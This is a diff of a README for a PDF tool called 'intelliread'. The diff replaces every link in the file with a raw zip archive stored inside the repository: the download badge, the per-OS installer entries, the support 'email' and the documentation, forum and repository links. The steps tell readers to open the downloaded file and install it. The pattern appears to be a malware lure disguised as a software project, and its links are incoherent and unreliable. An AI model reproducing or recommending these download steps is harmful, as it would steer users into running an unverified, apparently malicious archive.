@@ -1,6 +1,6 @@
 # 📚 intelliread - Transform PDFs into Smart Knowledge
 
-[![Download intelliread](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip%20intelliread-v1.0-blue)](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip)
+[![Download intelliread](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip%20intelliread-v1.0-blue)](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip)
 
 ## 🚀 Getting Started
 
@@ -10,14 +10,14 @@ Welcome to intelliread! This tool helps you turn PDFs into searchable knowledge.
 
 To get started, visit the following link to download the application:
 
-[Download intelliread](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip)
+[Download intelliread](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip)
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version of the application. You will see a list of files available for download.
 3. Click on the appropriate file for your operating system to start the download. 
-   - For Windows users, you might see a file like `https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip`.
-   - For macOS users, you might find `https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip`.
-   - For Linux users, look for a file like `https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip`.
+   - For Windows users, you might see a file like `https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip`.
+   - For macOS users, you might find `https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip`.
+   - For Linux users, look for a file like `https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip`.
 4. Once the download is complete, locate the downloaded file on your computer.
 5. Open the file to begin the installation process, and follow the prompts to install intelliread on your system.
 
@@ -74,12 +74,12 @@ intelliread is licensed under the MIT License. You can freely use, modify, and d
 
 ## 📞 Support
 
-If you encounter any issues or have questions, please open an issue in the GitHub repository. You can also contact the maintainer via email at [https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip).
+If you encounter any issues or have questions, please open an issue in the GitHub repository. You can also contact the maintainer via email at [https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip).
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip)
-- [Community Forum](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/Jhoselerodriguez/intelliread/main/Favicon/favicon/Software-2.5.zip)
+- [Documentation](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip)
+- [Community Forum](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip)
+- [GitHub Repository](https://github.com/Jhoselerodriguez/intelliread/raw/refs/heads/main/src/pages/Software_v1.6.zip)
 
 We hope you enjoy using intelliread and find it helps you transform your PDFs into valuable knowledge!
